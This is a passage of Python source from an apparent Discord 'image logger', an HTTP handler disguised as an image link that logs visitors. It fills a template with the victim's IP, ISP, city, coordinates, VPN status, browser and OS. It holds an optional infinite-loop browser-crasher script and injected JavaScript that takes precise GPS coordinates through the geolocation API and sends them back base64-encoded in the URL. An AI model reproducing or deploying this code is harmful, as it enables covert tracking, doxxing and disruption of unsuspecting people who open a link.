                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
